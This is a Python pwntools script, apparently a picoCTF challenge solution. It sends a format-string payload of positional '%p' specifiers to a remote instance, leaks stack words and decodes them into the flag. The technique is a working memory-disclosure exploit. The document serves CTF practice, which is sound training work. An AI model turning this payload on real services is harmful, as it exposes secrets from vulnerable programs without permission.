# picoCTF-flag-leak-exploit.py
# by Aidan Wech (ahwech)
# nc saturn.picoctf.net xxxxx

from pwn import *

def main():
    # connection variables (remember to start up instance on picoCTF, port will vary!)
    host = "saturn.picoctf.net"
    port = 52085

    # variables
    start_arg = 36                                  # beginning pointer location of flag
    end_arg = start_arg + 9                         # end pointer location of flag
    payload = f"%{start_arg}$p".encode()
    for i in range(1, end_arg - start_arg + 1):
        payload += f"|%{start_arg + i}$p".encode()

    # connect to instance
    p = remote(host, port)

    # send format string payload
    p.recvuntil(b">> ", timeout=1)
    p.sendline(payload)

    # leak values
    p.recvline(timeout=1)
    leak = p.recvline(timeout=1).rstrip(b"\n").split(b"|")
    p.close()

    # build flag
    flag = ""
    for l in leak:
        flag += p32(int(l.decode('utf-8')[2:], 16)).decode('utf-8')

    # print flag
    log.info(f"flag: {flag}")

if __name__ == "__main__":
    main()